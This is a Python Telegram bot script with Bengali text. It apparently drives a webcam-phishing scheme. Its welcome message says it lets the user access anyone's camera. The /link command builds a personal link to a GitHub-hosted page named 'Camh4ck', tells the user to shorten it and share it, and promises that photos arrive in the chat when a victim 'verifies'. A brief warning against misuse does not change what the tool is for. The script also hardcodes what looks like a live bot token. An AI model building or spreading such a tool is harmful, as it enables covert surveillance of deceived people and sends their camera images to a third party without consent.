import telebot
from telebot import types
import time

# আপনার বোট টোকেন
BOT_TOKEN = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs"
bot = telebot.TeleBot(BOT_TOKEN)

# আপনার GitHub ওয়েবসাইটের লিঙ্ক
BASE_URL = "https://myw4371-a11y.github.io/Camh4ck/"

def main_keyboard():
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    itembtn1 = types.KeyboardButton('/start')
    itembtn2 = types.KeyboardButton('/link')
    markup.add(itembtn1, itembtn2)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_name = message.from_user.first_name
    welcome_text = (
        f"হ্যালো {user_name}!\n"
        "Welcome to 50/50 bot\n"
        "এই বোটের সাহায্যে আপনি যে কারো ক্যামেরা এক্সেস করতে পারবেন।\n\n"
        "⚠️ সতর্কবার্তা: কেউ এটি খারাপ কাজে ব্যবহার করবেন না।\n\n"
        "নিচের বাটন থেকে আপনার লিঙ্ক তৈরি করুন।"
    )
    bot.send_message(message.chat.id, welcome_text, reply_markup=main_keyboard())

@bot.message_handler(commands=['link'])
def send_link(message):
    user_id = message.chat.id
    personal_link = f"{BASE_URL}?id={user_id}"
    
    response_text = (
        "✅ আপনার ভেরিফিকেশন লিঙ্ক তৈরি হয়েছে।\n\n"
        f"🔗 লিঙ্ক: {personal_link}\n\n"
        "লিঙ্কটি ছোট করুন:\n"
        "https://lc.cx/en\n\n"
        "এই লিঙ্কটি শেয়ার করুন। কেউ ভেরিফাই করলে ছবি এখানে আসবে।"
    )
    bot.send_message(user_id, response_text, reply_markup=main_keyboard())

# কানেকশন এরর হ্যান্ডেল করার জন্য লুপ
if __name__ == "__main__":
    while True:
        try:
            print("বোটটি সচল করার চেষ্টা করা হচ্ছে...")
            bot.remove_webhook() # পুরোনো জ্যাম ক্লিয়ার করবে
            time.sleep(2)
            # infinity_polling বোটকে ক্রাশ হওয়া থেকে বাঁচায়
            bot.infinity_polling(none_stop=True, timeout=60, long_polling_timeout=20)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5) # ৫ সেকেন্ড পর আবার চেষ্টা করবে
